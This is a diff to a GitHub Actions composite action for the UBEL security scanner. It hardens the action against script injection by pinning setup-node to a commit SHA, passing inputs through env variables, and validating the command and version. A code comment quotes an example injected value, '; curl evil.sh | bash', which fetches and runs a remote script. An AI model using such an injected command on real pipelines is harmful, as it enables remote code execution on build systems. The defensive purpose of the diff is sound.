@@ -2,7 +2,7 @@ name: 'UBEL Security Scan and dependencies firewall'
 description: 'Supply-chain, secrets, and SAST scanning via UBEL'
 inputs:
   command:
-    description: 'Which UBEL bin to run (sast, mal, cicd, secrets, npm, pnpm, bun, docker)'
+    description: 'Which UBEL bin to run: sast, mal, chunk, cicd, agent, platform, secrets, npm, pnpm, bun, docker'
     required: true
   version:
     description: 'Pinned @arcane-spark/ubel-node version'
@@ -13,8 +13,50 @@ inputs:
 runs:
   using: 'composite'
   steps:
-    - uses: actions/setup-node@v4
+    # Pinned by commit SHA, not the mutable `v4` tag — a tag can be
+    # repointed by the upstream maintainer or, in a compromise scenario,
+    # by an attacker with write access to that repo; a SHA can't.
+    # SHA below corresponds to the v4.0.2 release tag.
+    - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f # v4.0.2
       with:
         node-version: '20'
+
+    # `command`, `version`, and `args` are step INPUTS, not hardcoded
+    # values — a caller elsewhere in a workflow (or a reusable-workflow
+    # chain feeding this action a computed value) could supply anything.
+    # They're passed via `env:` and referenced as shell variables here
+    # rather than interpolated with `${{ }}` directly into the `run:`
+    # script text below. That distinction matters: `${{ }}` expansion
+    # happens BEFORE bash ever sees the script, so an input containing
+    # something like `; curl evil.sh | bash` would be spliced into the
+    # script as literal shell syntax and executed — this is GitHub's own
+    # documented "script injection" risk for composite/workflow actions
+    # (see: Security hardening for GitHub Actions, "Understanding the
+    # risk of script injection"). Referencing them as `$COMMAND`/`$ARGS`
+    # instead means bash only ever sees them as data.
+    #
+    # `command` is additionally checked against an explicit allow-list
+    # matching UBEL's actual registered `package.json` bin names, so this
+    # can never construct or execute a binary name that isn't one of ours
+    # — regardless of what a caller passes.
     - shell: bash
-      run: npx -p @arcane-spark/ubel-node@${{ inputs.version }} -- ubel-${{ inputs.command }} ${{ inputs.args }}
+      env:
+        UBEL_ACTION_COMMAND: ${{ inputs.command }}
+        UBEL_ACTION_VERSION: ${{ inputs.version }}
+        UBEL_ACTION_ARGS:    ${{ inputs.args }}
+      run: |
+        case "$UBEL_ACTION_COMMAND" in
+          sast|mal|chunk|cicd|agent|platform|secrets|npm|pnpm|bun|docker)
+            ;;
+          *)
+            echo "::error::Unknown command '$UBEL_ACTION_COMMAND' — must be one of: sast, mal, chunk, cicd, agent, platform, secrets, npm, pnpm, bun, docker"
+            exit 1
+            ;;
+        esac
+
+        if ! [[ "$UBEL_ACTION_VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+([-.].+)?$ ]]; then
+          echo "::error::version input must be a plain semver string, got '$UBEL_ACTION_VERSION'"
+          exit 1
+        fi
+
+        npx -p "@arcane-spark/ubel-node@${UBEL_ACTION_VERSION}" -- ubel-${UBEL_ACTION_COMMAND} $UBEL_ACTION_ARGS
